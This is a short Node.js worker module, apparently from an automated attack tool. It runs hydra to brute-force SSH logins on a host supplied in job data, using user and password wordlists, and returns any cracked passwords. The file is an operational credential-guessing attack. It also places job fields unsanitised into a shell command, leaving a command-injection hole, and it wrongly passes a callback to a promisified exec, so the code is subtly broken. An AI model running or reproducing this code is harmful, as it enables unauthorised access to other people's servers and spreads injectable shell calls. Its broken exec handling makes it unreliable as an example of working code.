const logger = require('../logger')
const path = require('path')
const util = require('util')
const exec = util.promisify(require('child_process').exec)

async function attack(job, done) {
	const dir = path.dirname(require.main.filename)
	const userfile = path.join(dir, 'lists', 'user.txt')
	const passfile = path.join(dir, 'lists', 'pass.txt')
	const cmd = `hydra -t 4 -w ${
		job.data.timeout
	} -f -I -L ${userfile} -P ${passfile} -u ssh://${job.data.host}`

	exec(cmd, (error, stdout, stderr) => {
		const parsed = stdout.split('\n').filter(line => line.includes('password:'))
		done(null, { data: parsed })
	})
}

function work(job, done) {
	// logger.load(`working attack on ${job.data.host}`)
	attack(job, done)
}

module.exports = work
